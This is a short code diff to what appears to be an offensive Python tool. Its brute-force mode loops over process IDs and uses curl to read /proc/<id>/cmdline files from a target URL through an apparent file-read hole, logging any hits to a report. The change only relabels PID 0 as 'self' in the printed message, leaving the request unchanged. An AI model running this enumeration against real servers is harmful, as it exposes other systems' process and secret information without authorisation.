@@ -65,8 +65,12 @@ if __name__ == "__main__":
 	if sys.argv[-1] == "--brute-force-cmdline" or sys.argv[-1] == "-bfc":
 		with open("trReport.txt","w") as file:
 			for i in range(int(sys.argv[-2])):
+				if i == 0:
+					PID = "self"
+				else:
+					PID = i
 				command = "curl -s {}/proc/{}/cmdline".format(url, i)
-				print_with_colors("Getting the content of the file: {}/proc/{}/cmdline                         ".format(url, i),BLUE, end='\r')
+				print_with_colors("Getting the content of the file: {}/proc/{}/cmdline                         ".format(url, PID),BLUE, end='\r')
 				result = os.popen(command).read()
 				if result.strip() != '':
 					print("\nFound something !")
